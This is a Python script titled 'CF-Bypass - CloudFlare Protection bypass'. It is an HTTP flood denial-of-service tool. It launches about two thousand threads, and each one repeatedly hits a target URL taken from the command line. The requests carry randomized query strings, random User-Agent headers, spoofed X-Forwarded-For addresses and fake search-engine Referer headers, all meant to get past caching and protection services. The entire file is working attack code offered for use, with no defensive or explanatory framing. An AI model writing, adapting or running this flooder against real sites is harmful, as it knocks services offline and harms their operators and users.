# -*- coding: utf-8 -*-

import urllib.request, urllib.error, urllib.parse
import sys
import threading
import random
import re
from fake_useragent import UserAgent

ref = ['https://www.sogou.com/web?ie={inputEncoding}&query=',
'https://www.baidu.com/#ie={inputEncoding}&wd=',
'https://www.bing.com/search?q=',
'https://www.so.com/s?ie={inputEncoding}&q=',
'https://duckduckgo.com/?q=',
'https://www.ask.com/web?q=',
'https://search.aol.com/aol/search?q=',
'https://swisscows.com/web?query=',
'https://www.mojeek.com/search?q=',
'https://fireball.de/de/search?q=',
'http://www.ceek.jp/search.cgi?q=',
'https://search.naver.com/search.naver?query=',
'https://nova.rambler.ru/search?query=',
'https://search.aol.com/aol/search?q=',
'https://www.search.com/web?q=',
'https://www.ecosia.org/search?q=',
'https://www.so.com/s?q=',
'https://search.yahoo.com/search?p=',
'https://www.usatoday.com/search/?q=',
'https://filehippo.com/search/?q=',
'https://worldofwarcraft.com/en-gb/?q=']

request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1

def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print ('===> Usage: cfbypass.py https://cloudflare.com <===')
	print ("\a")
print
(""" """)
print ('===> CF-Bypass -  CloudFlare Protection bypass <===')

	
def httpcall(url):
	code=0
	#proxy = random.choice(pprr).strip().split(":")
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	#proxies={"http":"http://"+str(proxy[0])+":"+str(proxy[1]),"https":"https://"+str(proxy[0])+":"+str(proxy[1])}
	request.add_header('User-Agent', UserAgent().random)
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(ref) + buildblock(random.randint(5,10)))
	request.add_header('X-Forwarded-For',str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
                    for x in range(1000):
                                         urllib.request.urlopen(request)
                                         urllib.request.urlopen(request)
                                         urllib.request.urlopen(request)
                                         urllib.request.urlopen(request)
                                         
	except urllib.error.HTTPError as e:
			#rint e.code
			set_flag(1)
			
			code=500
	except urllib.error.URLError as e:
			#rint e.reason
			sys.exit()
	else:
                    inc_counter()
                    for x in range(1000):
                                         urllib.request.urlopen(request)
                                         urllib.request.urlopen(request)
                                         urllib.request.urlopen(request)
                                         urllib.request.urlopen(request)
	return(code)



class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception as ex:
			pass


class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous!=request_counter):
				#print("%d THREADS" % (request_counter))
				previous=request_counter
		if flag==2:
			print("\n Start")


if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	
	else:
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		#pprr =open(sys.argv[2]).readlines()
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		m = re.search('https\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(500):
			t = HTTPThread().start()
			t = HTTPThread().start()
			t = HTTPThread().start()
			t = HTTPThread().start()
		t = MonitorThread()
		t.start()